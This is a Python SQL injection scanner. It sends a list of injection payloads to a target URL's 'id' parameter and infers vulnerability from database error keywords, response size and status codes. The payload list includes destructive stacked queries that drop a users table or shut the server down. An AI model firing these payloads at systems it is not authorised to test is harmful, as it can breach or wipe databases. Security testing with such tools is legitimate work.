"""
SQL Injection Detector Module
Tests for basic SQL injection vulnerabilities by sending test payloads.
Educational purposes only.
"""

import requests
from urllib.parse import quote

SQL_ERROR_KEYWORDS = [
    # MySQL
    "sql syntax",
    "mysql",
    "warning: mysql",
    "you have an error in your sql",
    "mysql_fetch",
    "mysql_num_rows",
    "mysqli_",

    # PostgreSQL
    "postgresql",
    "pg_query",
    "pg_exec",
    "unterminated quoted string",
    "psql",

    # Oracle
    "ora-",
    "oracle error",
    "quoted string not properly terminated",
    "sql command not properly ended",

    # MSSQL
    "microsoft sql",
    "mssql_query",
    "unclosed quotation mark",
    "odbc sql server driver",
    "sqlserver",

    # SQLite
    "sqlite",
    "sqlite3.operationalerror",
    "unrecognized token",

    # Generic
    "syntax error",
    "sql error",
    "database error",
    "db error",
    "query failed",
    "invalid query",
    "unexpected end of sql",
    "division by zero",
    "supplied argument is not a valid",
    "call to a member function",
]

SQL_PAYLOADS = [
    # Basic authentication bypass
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "\" OR \"1\"=\"1",
    "' OR 1=1 --",
    "admin' --",
    "admin' #",

    # Error-based injection
    "'",
    "\"",
    "1'1",
    "1 AND 1=1",
    "1 AND 1=2",
    "1' AND '1'='1",
    "1' AND '1'='2",

    # UNION-based
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL, NULL --",
    "1 UNION SELECT 1,2,3 --",

    # Time-based blind (will cause delay if vulnerable)
    "'; WAITFOR DELAY '0:0:5' --",
    "1; SELECT SLEEP(5) --",
    "1' AND SLEEP(5) --",

    # Stacked queries
    "1; DROP TABLE users --",
    "'; SHUTDOWN --",

    # Encoded payloads
    "%27%20OR%201%3D1%20--",
]


def detect_sqli(url: str) -> bool:
    """
    Test the target URL for SQL injection vulnerabilities.
    Sends test payloads and checks for SQL error keywords in the response.
    Also compares response sizes for anomalies.
    Returns True if potential vulnerability is detected.
    """
    try:
        # Get baseline response
        baseline = requests.get(url, timeout=10, allow_redirects=True)
        baseline_length = len(baseline.text)
        baseline_status = baseline.status_code

        for payload in SQL_PAYLOADS:
            # Test via query parameter
            separator = "&" if "?" in url else "?"
            test_url = f"{url}{separator}id={quote(payload)}"

            try:
                response = requests.get(test_url, timeout=10, allow_redirects=True)
                response_text = response.text.lower()

                # Check for SQL error keywords in response
                for keyword in SQL_ERROR_KEYWORDS:
                    if keyword in response_text:
                        return True

                # Check for significant response size difference
                response_length = len(response.text)
                if baseline_length > 0:
                    diff_ratio = abs(response_length - baseline_length) / baseline_length
                    if diff_ratio > 0.5:
                        return True

                # Check for status code change (e.g. 200 → 500)
                if response.status_code == 500 and baseline_status != 500:
                    return True

            except requests.exceptions.RequestException:
                continue

    except requests.exceptions.RequestException:
        pass

    return False
